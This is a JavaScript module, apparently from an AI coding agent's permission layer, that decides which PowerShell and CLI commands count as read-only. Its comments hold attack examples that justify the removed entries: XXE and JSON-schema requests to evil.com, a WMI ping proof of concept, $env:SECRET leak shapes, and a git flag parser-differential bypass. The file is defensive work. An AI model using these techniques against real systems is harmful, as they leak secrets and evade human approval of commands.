import { getPlatform } from "../../utils/platform.js";
import {
  COMMON_ALIASES,
  deriveSecurityFlags,
  getPipelineSegments,
  isNullRedirectionTarget,
  isPowerShellParameter
} from "../../utils/powershell/parser.js";
import {
  DOCKER_READ_ONLY_COMMANDS,
  EXTERNAL_READONLY_COMMANDS,
  GH_READ_ONLY_COMMANDS,
  GIT_READ_ONLY_COMMANDS,
  validateFlags
} from "../../utils/shell/readOnlyCommandValidation.js";
import { COMMON_PARAMETERS } from "./commonParameters.js";
const DOTNET_READ_ONLY_FLAGS = /* @__PURE__ */ new Set([
  "--version",
  "--info",
  "--list-runtimes",
  "--list-sdks"
]);
function argLeaksValue(_cmd, element) {
  const argTypes = (element?.elementTypes ?? []).slice(1);
  const args = element?.args ?? [];
  const children = element?.children;
  for (let i = 0; i < argTypes.length; i++) {
    if (argTypes[i] !== "StringConstant" && argTypes[i] !== "Parameter") {
      if (!/[$(@{[]/.test(args[i] ?? "")) {
        continue;
      }
      return true;
    }
    if (argTypes[i] === "Parameter") {
      const paramChildren = children?.[i];
      if (paramChildren) {
        if (paramChildren.some((c) => c.type !== "StringConstant")) {
          return true;
        }
      } else {
        const arg = args[i] ?? "";
        const colonIdx = arg.indexOf(":");
        if (colonIdx > 0 && /[$(@{[]/.test(arg.slice(colonIdx + 1))) {
          return true;
        }
      }
    }
  }
  return false;
}
const CMDLET_ALLOWLIST = Object.assign(
  /* @__PURE__ */ Object.create(null),
  {
    // =========================================================================
    // PowerShell Cmdlets - Filesystem (read-only)
    // =========================================================================
    "get-childitem": {
      safeFlags: [
        "-Path",
        "-LiteralPath",
        "-Filter",
        "-Include",
        "-Exclude",
        "-Recurse",
        "-Depth",
        "-Name",
        "-Force",
        "-Attributes",
        "-Directory",
        "-File",
        "-Hidden",
        "-ReadOnly",
        "-System"
      ]
    },
    "get-content": {
      safeFlags: [
        "-Path",
        "-LiteralPath",
        "-TotalCount",
        "-Head",
        "-Tail",
        "-Raw",
        "-Encoding",
        "-Delimiter",
        "-ReadCount"
      ]
    },
    "get-item": {
      safeFlags: ["-Path", "-LiteralPath", "-Force", "-Stream"]
    },
    "get-itemproperty": {
      safeFlags: ["-Path", "-LiteralPath", "-Name"]
    },
    "test-path": {
      safeFlags: [
        "-Path",
        "-LiteralPath",
        "-PathType",
        "-Filter",
        "-Include",
        "-Exclude",
        "-IsValid",
        "-NewerThan",
        "-OlderThan"
      ]
    },
    "resolve-path": {
      safeFlags: ["-Path", "-LiteralPath", "-Relative"]
    },
    "get-filehash": {
      safeFlags: ["-Path", "-LiteralPath", "-Algorithm", "-InputStream"]
    },
    "get-acl": {
      safeFlags: [
        "-Path",
        "-LiteralPath",
        "-Audit",
        "-Filter",
        "-Include",
        "-Exclude"
      ]
    },
    // =========================================================================
    // PowerShell Cmdlets - Navigation (read-only, just changes working directory)
    // =========================================================================
    "set-location": {
      safeFlags: ["-Path", "-LiteralPath", "-PassThru", "-StackName"]
    },
    "push-location": {
      safeFlags: ["-Path", "-LiteralPath", "-PassThru", "-StackName"]
    },
    "pop-location": {
      safeFlags: ["-PassThru", "-StackName"]
    },
    // =========================================================================
    // PowerShell Cmdlets - Text searching/filtering (read-only)
    // =========================================================================
    "select-string": {
      safeFlags: [
        "-Path",
        "-LiteralPath",
        "-Pattern",
        "-InputObject",
        "-SimpleMatch",
        "-CaseSensitive",
        "-Quiet",
        "-List",
        "-NotMatch",
        "-AllMatches",
        "-Encoding",
        "-Context",
        "-Raw",
        "-NoEmphasis"
      ]
    },
    // =========================================================================
    // PowerShell Cmdlets - Data conversion (pure transforms, no side effects)
    // =========================================================================
    "convertto-json": {
      safeFlags: [
        "-InputObject",
        "-Depth",
        "-Compress",
        "-EnumsAsStrings",
        "-AsArray"
      ]
    },
    "convertfrom-json": {
      safeFlags: ["-InputObject", "-Depth", "-AsHashtable", "-NoEnumerate"]
    },
    "convertto-csv": {
      safeFlags: [
        "-InputObject",
        "-Delimiter",
        "-NoTypeInformation",
        "-NoHeader",
        "-UseQuotes"
      ]
    },
    "convertfrom-csv": {
      safeFlags: ["-InputObject", "-Delimiter", "-Header", "-UseCulture"]
    },
    "convertto-xml": {
      safeFlags: ["-InputObject", "-Depth", "-As", "-NoTypeInformation"]
    },
    "convertto-html": {
      safeFlags: [
        "-InputObject",
        "-Property",
        "-Head",
        "-Title",
        "-Body",
        "-Pre",
        "-Post",
        "-As",
        "-Fragment"
      ]
    },
    "format-hex": {
      safeFlags: [
        "-Path",
        "-LiteralPath",
        "-InputObject",
        "-Encoding",
        "-Count",
        "-Offset"
      ]
    },
    // =========================================================================
    // PowerShell Cmdlets - Object inspection and manipulation (read-only)
    // =========================================================================
    "get-member": {
      safeFlags: [
        "-InputObject",
        "-MemberType",
        "-Name",
        "-Static",
        "-View",
        "-Force"
      ]
    },
    "get-unique": {
      safeFlags: ["-InputObject", "-AsString", "-CaseInsensitive", "-OnType"]
    },
    "compare-object": {
      safeFlags: [
        "-ReferenceObject",
        "-DifferenceObject",
        "-Property",
        "-SyncWindow",
        "-CaseSensitive",
        "-Culture",
        "-ExcludeDifferent",
        "-IncludeEqual",
        "-PassThru"
      ]
    },
    // SECURITY: select-xml REMOVED. XML external entity (XXE) resolution can
    // trigger network requests via DOCTYPE SYSTEM/PUBLIC references in -Content
    // or -Xml. `Select-Xml -Content '<!DOCTYPE x [<!ENTITY e SYSTEM
    // "http://evil.com/x">]><x>&e;</x>' -XPath '/'` sends a GET request.
    // PowerShell's XmlDocument.LoadXml doesn't disable entity resolution by
    // default. Removal forces prompt.
    "join-string": {
      safeFlags: [
        "-InputObject",
        "-Property",
        "-Separator",
        "-OutputPrefix",
        "-OutputSuffix",
        "-SingleQuote",
        "-DoubleQuote",
        "-FormatString"
      ]
    },
    // SECURITY: Test-Json REMOVED. -Schema (positional 1) accepts JSON Schema
    // with $ref pointing to external URLs — Test-Json fetches them (network
    // request). safeFlags only validates EXPLICIT flags, not positional binding:
    // `Test-Json '{}' '{"$ref":"http://evil.com"}'` → position 1 binds to
    // -Schema → safeFlags check sees two non-flag args, skips both → auto-allow.
    "get-random": {
      safeFlags: [
        "-InputObject",
        "-Minimum",
        "-Maximum",
        "-Count",
        "-SetSeed",
        "-Shuffle"
      ]
    },
    // =========================================================================
    // PowerShell Cmdlets - Path utilities (read-only)
    // =========================================================================
    // convert-path's entire purpose is to resolve filesystem paths. It is now
    // in CMDLET_PATH_CONFIG for proper path validation, so safeFlags here only
    // list the path parameters (which CMDLET_PATH_CONFIG will validate).
    "convert-path": {
      safeFlags: ["-Path", "-LiteralPath"]
    },
    "join-path": {
      // -Resolve removed: it touches the filesystem to verify the joined path
      // exists, but the path was not validated against allowed directories.
      // Without -Resolve, Join-Path is pure string manipulation.
      safeFlags: ["-Path", "-ChildPath", "-AdditionalChildPath"]
    },
    "split-path": {
      // -Resolve removed: same rationale as join-path. Without -Resolve,
      // Split-Path is pure string manipulation.
      safeFlags: [
        "-Path",
        "-LiteralPath",
        "-Qualifier",
        "-NoQualifier",
        "-Parent",
        "-Leaf",
        "-LeafBase",
        "-Extension",
        "-IsAbsolute"
      ]
    },
    // =========================================================================
    // PowerShell Cmdlets - Additional system info (read-only)
    // =========================================================================
    // NOTE: Get-Clipboard is intentionally NOT included - it can expose sensitive
    // data like passwords or API keys that the user may have copied. Bash also
    // does not auto-allow clipboard commands (pbpaste, xclip, etc.).
    "get-hotfix": {
      safeFlags: ["-Id", "-Description"]
    },
    "get-itempropertyvalue": {
      safeFlags: ["-Path", "-LiteralPath", "-Name"]
    },
    "get-psprovider": {
      safeFlags: ["-PSProvider"]
    },
    // =========================================================================
    // PowerShell Cmdlets - Process/System info
    // =========================================================================
    "get-process": {
      safeFlags: [
        "-Name",
        "-Id",
        "-Module",
        "-FileVersionInfo",
        "-IncludeUserName"
      ]
    },
    "get-service": {
      safeFlags: [
        "-Name",
        "-DisplayName",
        "-DependentServices",
        "-RequiredServices",
        "-Include",
        "-Exclude"
      ]
    },
    "get-computerinfo": {
      allowAllFlags: true
    },
    "get-host": {
      allowAllFlags: true
    },
    "get-date": {
      safeFlags: ["-Date", "-Format", "-UFormat", "-DisplayHint", "-AsUTC"]
    },
    "get-location": {
      safeFlags: ["-PSProvider", "-PSDrive", "-Stack", "-StackName"]
    },
    "get-psdrive": {
      safeFlags: ["-Name", "-PSProvider", "-Scope"]
    },
    // SECURITY: Get-Command REMOVED from allowlist. -Name (positional 0,
    // ValueFromPipeline=true) triggers module autoload which runs .psm1 init
    // code. Chain attack: pre-plant module in PSModulePath, trigger autoload.
    // Previously tried removing -Name/-Module from safeFlags + rejecting
    // positional StringConstant, but pipeline input (`'EvilCmdlet' | Get-Command`)
    // bypasses the callback entirely since args are empty. Removal forces
    // prompt. Users who need it can add explicit allow rule.
    "get-module": {
      safeFlags: [
        "-Name",
        "-ListAvailable",
        "-All",
        "-FullyQualifiedName",
        "-PSEdition"
      ]
    },
    // SECURITY: Get-Help REMOVED from allowlist. Same module autoload hazard
    // as Get-Command (-Name has ValueFromPipeline=true, pipeline input bypasses
    // arg-level callback). Removal forces prompt.
    "get-alias": {
      safeFlags: ["-Name", "-Definition", "-Scope", "-Exclude"]
    },
    "get-history": {
      safeFlags: ["-Id", "-Count"]
    },
    "get-culture": {
      allowAllFlags: true
    },
    "get-uiculture": {
      allowAllFlags: true
    },
    "get-timezone": {
      safeFlags: ["-Name", "-Id", "-ListAvailable"]
    },
    "get-uptime": {
      allowAllFlags: true
    },
    // =========================================================================
    // PowerShell Cmdlets - Output & misc (no side effects)
    // =========================================================================
    // Bash parity: `echo` is auto-allowed via custom regex (BashTool
    // readOnlyValidation.ts:~1517). That regex WHITELISTS safe chars per arg.
    // See argLeaksValue above for the three attack shapes it blocks.
    "write-output": {
      safeFlags: ["-InputObject", "-NoEnumerate"],
      additionalCommandIsDangerousCallback: argLeaksValue
    },
    // Write-Host bypasses the pipeline (Information stream, PS5+), so it's
    // strictly less capable than Write-Output — but the same
    // `Write-Host $env:SECRET` leak-via-display applies.
    "write-host": {
      safeFlags: [
        "-Object",
        "-NoNewline",
        "-Separator",
        "-ForegroundColor",
        "-BackgroundColor"
      ],
      additionalCommandIsDangerousCallback: argLeaksValue
    },
    // Bash parity: `sleep` is in READONLY_COMMANDS (BashTool
    // readOnlyValidation.ts:~1146). Zero side effects at runtime — but
    // `Start-Sleep $env:SECRET` leaks via type-coerce error. Same guard.
    "start-sleep": {
      safeFlags: ["-Seconds", "-Milliseconds", "-Duration"],
      additionalCommandIsDangerousCallback: argLeaksValue
    },
    // Format-* and Measure-Object moved here from SAFE_OUTPUT_CMDLETS after
    // security review found all accept calculated-property hashtables (same
    // exploit as Where-Object — I4 regression). isSafeOutputCommand is a
    // NAME-ONLY check that filtered them out of the approval loop BEFORE arg
    // validation. Here, argLeaksValue validates args:
    //   | Format-Table               → no args → safe → allow
    //   | Format-Table Name, CPU     → StringConstant positionals → safe → allow
    //   | Format-Table $env:SECRET   → Variable elementType → blocked → passthrough
    //   | Format-Table @{N='x';E={}} → Other (HashtableAst) → blocked → passthrough
    //   | Measure-Object -Property $env:SECRET → same → blocked
    // allowAllFlags: argLeaksValue validates arg elementTypes (Variable/Hashtable/
    // ScriptBlock → blocked). Format-* flags themselves (-AutoSize, -GroupBy,
    // -Wrap, etc.) are display-only. Without allowAllFlags, the empty-safeFlags
    // default rejects ALL flags — `Format-Table -AutoSize` would over-prompt.
    "format-table": {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue
    },
    "format-list": {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue
    },
    "format-wide": {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue
    },
    "format-custom": {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue
    },
    "measure-object": {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue
    },
    // Select-Object/Sort-Object/Group-Object/Where-Object: same calculated-
    // property hashtable surface as format-* (about_Calculated_Properties).
    // Removed from SAFE_OUTPUT_CMDLETS but previously missing here, causing
    // `Get-Process | Select-Object Name` to over-prompt. argLeaksValue handles
    // them identically: StringConstant property names pass (`Select-Object Name`),
    // HashtableAst/ScriptBlock/Variable args block (`Select-Object @{N='x';E={...}}`,
    // `Where-Object { ... }`). allowAllFlags: -First/-Last/-Skip/-Descending/
    // -Property/-EQ etc. are all selection/ordering flags — harmless on their own;
    // argLeaksValue catches the dangerous arg *values*.
    "select-object": {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue
    },
    "sort-object": {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue
    },
    "group-object": {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue
    },
    "where-object": {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue
    },
    // Out-String/Out-Host moved here from SAFE_OUTPUT_CMDLETS — both accept
    // -InputObject which leaks the same way Write-Output does.
    // `Get-Process | Out-String -InputObject $env:SECRET` → secret prints.
    // allowAllFlags: -Width/-Stream/-Paging/-NoNewline are display flags;
    // argLeaksValue catches the dangerous -InputObject *value*.
    "out-string": {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue
    },
    "out-host": {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue
    },
    // =========================================================================
    // PowerShell Cmdlets - Network info (read-only)
    // =========================================================================
    "get-netadapter": {
      safeFlags: [
        "-Name",
        "-InterfaceDescription",
        "-InterfaceIndex",
        "-Physical"
      ]
    },
    "get-netipaddress": {
      safeFlags: [
        "-InterfaceIndex",
        "-InterfaceAlias",
        "-AddressFamily",
        "-Type"
      ]
    },
    "get-netipconfiguration": {
      safeFlags: ["-InterfaceIndex", "-InterfaceAlias", "-Detailed", "-All"]
    },
    "get-netroute": {
      safeFlags: [
        "-InterfaceIndex",
        "-InterfaceAlias",
        "-AddressFamily",
        "-DestinationPrefix"
      ]
    },
    "get-dnsclientcache": {
      // SECURITY: -CimSession/-ThrottleLimit excluded. -CimSession connects to
      // a remote host (network request). Previously empty config = all flags OK.
      safeFlags: ["-Entry", "-Name", "-Type", "-Status", "-Section", "-Data"]
    },
    "get-dnsclient": {
      safeFlags: ["-InterfaceIndex", "-InterfaceAlias"]
    },
    // =========================================================================
    // PowerShell Cmdlets - Event log (read-only)
    // =========================================================================
    "get-eventlog": {
      safeFlags: [
        "-LogName",
        "-Newest",
        "-After",
        "-Before",
        "-EntryType",
        "-Index",
        "-InstanceId",
        "-Message",
        "-Source",
        "-UserName",
        "-AsBaseObject",
        "-List"
      ]
    },
    "get-winevent": {
      // SECURITY: -FilterXml/-FilterHashtable removed. -FilterXml accepts XML
      // with DOCTYPE external entities (XXE → network request). -FilterHashtable
      // would be caught by the elementTypes 'Other' check since @{} is
      // HashtableAst, but removal is explicit. Same XXE hazard as Select-Xml
      // (removed above). -FilterXPath kept (string pattern only, no entity
      // resolution). -ComputerName/-Credential also implicitly excluded.
      safeFlags: [
        "-LogName",
        "-ListLog",
        "-ListProvider",
        "-ProviderName",
        "-Path",
        "-MaxEvents",
        "-FilterXPath",
        "-Force",
        "-Oldest"
      ]
    },
    // =========================================================================
    // PowerShell Cmdlets - WMI/CIM
    // =========================================================================
    // SECURITY: Get-WmiObject and Get-CimInstance REMOVED. They actively
    // trigger network requests via classes like Win32_PingStatus (sends ICMP
    // when enumerated) and can query remote computers via -ComputerName/
    // CimSession. -Class/-ClassName/-Filter/-Query accept arbitrary WMI
    // classes/WQL that we cannot statically validate.
    //   PoC: Get-WmiObject -Class Win32_PingStatus -Filter 'Address="evil.com"'
    //   → sends ICMP to evil.com (DNS leak + potential NTLM auth leak).
    // WMI can also auto-load provider DLLs (init code). Removal forces prompt.
    // get-cimclass stays — only lists class metadata, no instance enumeration.
    "get-cimclass": {
      safeFlags: [
        "-ClassName",
        "-Namespace",
        "-MethodName",
        "-PropertyName",
        "-QualifierName"
      ]
    },
    // =========================================================================
    // Git - uses shared external command validation with per-flag checking
    // =========================================================================
    git: {},
    // =========================================================================
    // GitHub CLI (gh) - uses shared external command validation
    // =========================================================================
    gh: {},
    // =========================================================================
    // Docker - uses shared external command validation
    // =========================================================================
    docker: {},
    // =========================================================================
    // Windows-specific system commands
    // =========================================================================
    ipconfig: {
      // SECURITY: On macOS, `ipconfig set <iface> <mode>` configures network
      // (writes system config). safeFlags only validates FLAGS, positional args
      // are SKIPPED. Reject any positional argument — only bare `ipconfig` or
      // `ipconfig /all` (read-only display) allowed. Windows ipconfig only uses
      // /flags (display), macOS ipconfig uses subcommands (get/set/waitall).
      safeFlags: ["/all", "/displaydns", "/allcompartments"],
      additionalCommandIsDangerousCallback: (_cmd, element) => {
        return (element?.args ?? []).some(
          (a) => !a.startsWith("/") && !a.startsWith("-")
        );
      }
    },
    netstat: {
      safeFlags: [
        "-a",
        "-b",
        "-e",
        "-f",
        "-n",
        "-o",
        "-p",
        "-q",
        "-r",
        "-s",
        "-t",
        "-x",
        "-y"
      ]
    },
    systeminfo: {
      safeFlags: ["/FO", "/NH"]
    },
    tasklist: {
      safeFlags: ["/M", "/SVC", "/V", "/FI", "/FO", "/NH"]
    },
    // where.exe: Windows PATH locator, bash `which` equivalent. Reaches here via
    // SAFE_EXTERNAL_EXES bypass at the nameType gate in isAllowlistedCommand.
    // All flags are read-only (/R /F /T /Q), matching bash's treatment of `which`
    // in BashTool READONLY_COMMANDS.
    "where.exe": {
      allowAllFlags: true
    },
    hostname: {
      // SECURITY: `hostname NAME` on Linux/macOS SETS the hostname (writes to
      // system config). `hostname -F FILE` / `--file=FILE` also sets from file.
      // Only allow bare `hostname` and known read-only flags.
      safeFlags: ["-a", "-d", "-f", "-i", "-I", "-s", "-y", "-A"],
      additionalCommandIsDangerousCallback: (_cmd, element) => {
        return (element?.args ?? []).some((a) => !a.startsWith("-"));
      }
    },
    whoami: {
      safeFlags: [
        "/user",
        "/groups",
        "/claims",
        "/priv",
        "/logonid",
        "/all",
        "/fo",
        "/nh"
      ]
    },
    ver: {
      allowAllFlags: true
    },
    arp: {
      safeFlags: ["-a", "-g", "-v", "-N"]
    },
    route: {
      safeFlags: ["print", "PRINT", "-4", "-6"],
      additionalCommandIsDangerousCallback: (_cmd, element) => {
        if (!element) {
          return true;
        }
        const verb = element.args.find((a) => !a.startsWith("-"));
        return verb?.toLowerCase() !== "print";
      }
    },
    // netsh: intentionally NOT allowlisted. Three rounds of denylist gaps in PR
    // #22060 (verb position → dash flags → slash flags → more verbs) proved
    // the grammar is too complex to allowlist safely: 3-deep context nesting
    // (`netsh interface ipv4 show addresses`), dual-prefix flags (-f / /f),
    // script execution via -f and `exec`, remote RPC via -r, offline-mode
    // commit, wlan connect/disconnect, etc. Each denylist expansion revealed
    // another gap. `route` stays — `route print` is the only read-only form,
    // simple single-verb-position grammar.
    getmac: {
      safeFlags: ["/FO", "/NH", "/V"]
    },
    // =========================================================================
    // Cross-platform CLI tools
    // =========================================================================
    // File inspection
    // SECURITY: file -C compiles a magic database and WRITES to disk. Only
    // allow introspection flags; reject -C / --compile / -m / --magic-file.
    file: {
      safeFlags: [
        "-b",
        "--brief",
        "-i",
        "--mime",
        "-L",
        "--dereference",
        "--mime-type",
        "--mime-encoding",
        "-z",
        "--uncompress",
        "-p",
        "--preserve-date",
        "-k",
        "--keep-going",
        "-r",
        "--raw",
        "-v",
        "--version",
        "-0",
        "--print0",
        "-s",
        "--special-files",
        "-l",
        "-F",
        "--separator",
        "-e",
        "-P",
        "-N",
        "--no-pad",
        "-E",
        "--extension"
      ]
    },
    tree: {
      safeFlags: ["/F", "/A", "/Q", "/L"]
    },
    findstr: {
      safeFlags: [
        "/B",
        "/E",
        "/L",
        "/R",
        "/S",
        "/I",
        "/X",
        "/V",
        "/N",
        "/M",
        "/O",
        "/P",
        // Flag matching strips ':' before comparison (e.g., /C:pattern → /C),
        // so these entries must NOT include the trailing colon.
        "/C",
        "/G",
        "/D",
        "/A"
      ]
    },
    // =========================================================================
    // Package managers - uses shared external command validation
    // =========================================================================
    dotnet: {}
    // SECURITY: man and help direct entries REMOVED. They aliased Get-Help
    // (also removed — see above). Without these entries, lookupAllowlist
    // resolves via COMMON_ALIASES to 'get-help' which is not in allowlist →
    // prompt. Same module-autoload hazard as Get-Help.
  }
);
const SAFE_OUTPUT_CMDLETS = /* @__PURE__ */ new Set([
  "out-null"
  // NOT out-string/out-host — both accept -InputObject which leaks args the
  // same way Write-Output does. Moved to CMDLET_ALLOWLIST with argLeaksValue.
  // `Get-Process | Out-String -InputObject $env:SECRET` — Out-String was
  // filtered name-only, the $env arg was never validated.
  // out-null stays: it discards everything, no -InputObject leak.
  // NOT foreach-object / where-object / select-object / sort-object /
  // group-object / format-table / format-list / format-wide / format-custom /
  // measure-object — ALL accept calculated-property hashtables or script-block
  // predicates that evaluate arbitrary expressions at runtime
  // (about_Calculated_Properties). Examples:
  //   Where-Object @{k=$env:SECRET}       — HashtableAst arg, 'Other' elementType
  //   Select-Object @{N='x';E={...}}      — calculated property scriptblock
  //   Format-Table $env:SECRET            — positional -Property, prints as header
  //   Measure-Object -Property $env:SECRET — leaks via "property 'sk-...' not found"
  //   ForEach-Object { $env:PATH='e' }    — arbitrary script body
  // isSafeOutputCommand is a NAME-ONLY check — step-5 filters these out of
  // the approval loop BEFORE arg validation runs. With them here, an
  // all-safe-output tail auto-allows on empty subCommands regardless of
  // what the arg contains. Removing them forces the tail through arg-level
  // validation (hashtable is 'Other' elementType → fails the whitelist at
  // isAllowlistedCommand → ask; bare $var is 'Variable' → same).
  //
  // NOT write-output — pipeline-initial $env:VAR is a VariableExpressionAst,
  // skipped by getSubCommandsForPermissionCheck (non-CommandAst). With
  // write-output here, `$env:SECRET | Write-Output` → WO filtered as
  // safe-output → empty subCommands → auto-allow → secret prints. The
  // CMDLET_ALLOWLIST entry handles direct `Write-Output 'literal'`.
]);
const PIPELINE_TAIL_CMDLETS = /* @__PURE__ */ new Set([
  "format-table",
  "format-list",
  "format-wide",
  "format-custom",
  "measure-object",
  "select-object",
  "sort-object",
  "group-object",
  "where-object",
  "out-string",
  "out-host"
]);
const SAFE_EXTERNAL_EXES = /* @__PURE__ */ new Set(["where.exe"]);
const WINDOWS_PATHEXT = /\.(exe|cmd|bat|com)$/;
function resolveToCanonical(name) {
  let lower = name.toLowerCase();
  if (!lower.includes("\\") && !lower.includes("/")) {
    lower = lower.replace(WINDOWS_PATHEXT, "");
  }
  const alias = COMMON_ALIASES[lower];
  if (alias) {
    return alias.toLowerCase();
  }
  return lower;
}
function isCwdChangingCmdlet(name) {
  const canonical = resolveToCanonical(name);
  return canonical === "set-location" || canonical === "push-location" || canonical === "pop-location" || // New-PSDrive creates a drive mapping that redirects <name>:/... paths
  // to an arbitrary filesystem root. Aliases ndr/mount are not in
  // COMMON_ALIASES — check them explicitly (finding #21).
  canonical === "new-psdrive" || // ndr/mount are PS aliases for New-PSDrive on Windows only. On POSIX,
  // 'mount' is the native mount(8) command; treating it as PSDrive-creating
  // would false-positive. (bug #15 / review nit)
  getPlatform() === "windows" && (canonical === "ndr" || canonical === "mount");
}
function isSafeOutputCommand(name) {
  const canonical = resolveToCanonical(name);
  return SAFE_OUTPUT_CMDLETS.has(canonical);
}
function isAllowlistedPipelineTail(cmd, originalCommand) {
  const canonical = resolveToCanonical(cmd.name);
  if (!PIPELINE_TAIL_CMDLETS.has(canonical)) {
    return false;
  }
  return isAllowlistedCommand(cmd, originalCommand);
}
function isProvablySafeStatement(stmt) {
  if (stmt.statementType !== "PipelineAst") return false;
  if (stmt.commands.length === 0) return false;
  for (const cmd of stmt.commands) {
    if (cmd.elementType !== "CommandAst") return false;
  }
  return true;
}
function lookupAllowlist(name) {
  const lower = name.toLowerCase();
  const direct = CMDLET_ALLOWLIST[lower];
  if (direct) {
    return direct;
  }
  const canonical = resolveToCanonical(lower);
  if (canonical !== lower) {
    return CMDLET_ALLOWLIST[canonical];
  }
  return void 0;
}
function hasSyncSecurityConcerns(command) {
  const trimmed = command.trim();
  if (!trimmed) {
    return false;
  }
  if (/\$\(/.test(trimmed)) {
    return true;
  }
  if (/(?:^|[^\w.])@\w+/.test(trimmed)) {
    return true;
  }
  if (/\.\w+\s*\(/.test(trimmed)) {
    return true;
  }
  if (/\$\w+\s*[+\-*/]?=/.test(trimmed)) {
    return true;
  }
  if (/--%/.test(trimmed)) {
    return true;
  }
  if (/\\\\/.test(trimmed) || /(?<!:)\/\//.test(trimmed)) {
    return true;
  }
  if (/::/.test(trimmed)) {
    return true;
  }
  return false;
}
function isReadOnlyCommand(command, parsed) {
  const trimmedCommand = command.trim();
  if (!trimmedCommand) {
    return false;
  }
  if (!parsed) {
    return false;
  }
  if (!parsed.valid) {
    return false;
  }
  const security = deriveSecurityFlags(parsed);
  if (security.hasScriptBlocks || security.hasSubExpressions || security.hasExpandableStrings || security.hasSplatting || security.hasMemberInvocations || security.hasAssignments || security.hasStopParsing) {
    return false;
  }
  const segments = getPipelineSegments(parsed);
  if (segments.length === 0) {
    return false;
  }
  const totalCommands = segments.reduce(
    (sum, seg) => sum + seg.commands.length,
    0
  );
  if (totalCommands > 1) {
    const hasCd = segments.some(
      (seg) => seg.commands.some((cmd) => isCwdChangingCmdlet(cmd.name))
    );
    if (hasCd) {
      return false;
    }
  }
  for (const pipeline of segments) {
    if (!pipeline || pipeline.commands.length === 0) {
      return false;
    }
    if (pipeline.redirections.length > 0) {
      const hasFileRedirection = pipeline.redirections.some(
        (r) => !r.isMerging && !isNullRedirectionTarget(r.target)
      );
      if (hasFileRedirection) {
        return false;
      }
    }
    const firstCmd = pipeline.commands[0];
    if (!firstCmd) {
      return false;
    }
    if (!isAllowlistedCommand(firstCmd, command)) {
      return false;
    }
    for (let i = 1; i < pipeline.commands.length; i++) {
      const cmd = pipeline.commands[i];
      if (!cmd || cmd.nameType === "application") {
        return false;
      }
      if (isSafeOutputCommand(cmd.name) && cmd.args.length === 0) {
        continue;
      }
      if (!isAllowlistedCommand(cmd, command)) {
        return false;
      }
    }
    if (pipeline.nestedCommands && pipeline.nestedCommands.length > 0) {
      return false;
    }
  }
  return true;
}
function isAllowlistedCommand(cmd, originalCommand) {
  if (cmd.nameType === "application") {
    const rawFirstToken = cmd.text.split(/\s/, 1)[0]?.toLowerCase() ?? "";
    if (!SAFE_EXTERNAL_EXES.has(rawFirstToken)) {
      return false;
    }
  }
  const config = lookupAllowlist(cmd.name);
  if (!config) {
    return false;
  }
  if (config.regex && !config.regex.test(originalCommand)) {
    return false;
  }
  if (config.additionalCommandIsDangerousCallback?.(originalCommand, cmd)) {
    return false;
  }
  if (!cmd.elementTypes) {
    return false;
  }
  {
    for (let i = 1; i < cmd.elementTypes.length; i++) {
      const t = cmd.elementTypes[i];
      if (t !== "StringConstant" && t !== "Parameter") {
        if (!/[$(@{[]/.test(cmd.args[i - 1] ?? "")) {
          continue;
        }
        return false;
      }
      if (t === "Parameter") {
        const paramChildren = cmd.children?.[i - 1];
        if (paramChildren) {
          if (paramChildren.some((c) => c.type !== "StringConstant")) {
            return false;
          }
        } else {
          const arg = cmd.args[i - 1] ?? "";
          const colonIdx = arg.indexOf(":");
          if (colonIdx > 0 && /[$(@{[]/.test(arg.slice(colonIdx + 1))) {
            return false;
          }
        }
      }
    }
  }
  const canonical = resolveToCanonical(cmd.name);
  if (canonical === "git" || canonical === "gh" || canonical === "docker" || canonical === "dotnet") {
    return isExternalCommandSafe(canonical, cmd.args);
  }
  const isCmdlet = canonical.includes("-");
  if (config.allowAllFlags) {
    return true;
  }
  if (!config.safeFlags || config.safeFlags.length === 0) {
    const hasFlags = cmd.args.some((arg, i) => {
      if (isCmdlet) {
        return isPowerShellParameter(arg, cmd.elementTypes?.[i + 1]);
      }
      return arg.startsWith("-") || process.platform === "win32" && arg.startsWith("/");
    });
    return !hasFlags;
  }
  for (let i = 0; i < cmd.args.length; i++) {
    const arg = cmd.args[i];
    const isFlag = isCmdlet ? isPowerShellParameter(arg, cmd.elementTypes?.[i + 1]) : arg.startsWith("-") || process.platform === "win32" && arg.startsWith("/");
    if (isFlag) {
      let paramName = isCmdlet ? "-" + arg.slice(1) : arg;
      const colonIndex = paramName.indexOf(":");
      if (colonIndex > 0) {
        paramName = paramName.substring(0, colonIndex);
      }
      const paramLower = paramName.toLowerCase();
      if (isCmdlet && COMMON_PARAMETERS.has(paramLower)) {
        continue;
      }
      const isSafe = config.safeFlags.some(
        (flag) => flag.toLowerCase() === paramLower
      );
      if (!isSafe) {
        return false;
      }
    }
  }
  return true;
}
function isExternalCommandSafe(command, args) {
  switch (command) {
    case "git":
      return isGitSafe(args);
    case "gh":
      return isGhSafe(args);
    case "docker":
      return isDockerSafe(args);
    case "dotnet":
      return isDotnetSafe(args);
    default:
      return false;
  }
}
const DANGEROUS_GIT_GLOBAL_FLAGS = /* @__PURE__ */ new Set([
  "-c",
  "-C",
  "--exec-path",
  "--config-env",
  "--git-dir",
  "--work-tree",
  // SECURITY: --attr-source creates a parser differential. Git treats the
  // token after the tree-ish value as a pathspec (not the subcommand), but
  // our skip-by-2 loop would treat it as the subcommand:
  //   git --attr-source HEAD~10 log status
  //   validator: advances past HEAD~10, sees subcmd=log → allow
  //   git:       consumes `log` as pathspec, runs `status` as the real subcmd
  // Verified with `GIT_TRACE=1 git --attr-source HEAD~10 log status` →
  // `trace: built-in: git status`. Reject outright rather than skip-by-2.
  "--attr-source"
]);
const GIT_GLOBAL_FLAGS_WITH_VALUES = /* @__PURE__ */ new Set([
  "-c",
  "-C",
  "--exec-path",
  "--config-env",
  "--git-dir",
  "--work-tree",
  "--namespace",
  "--super-prefix",
  "--shallow-file"
]);
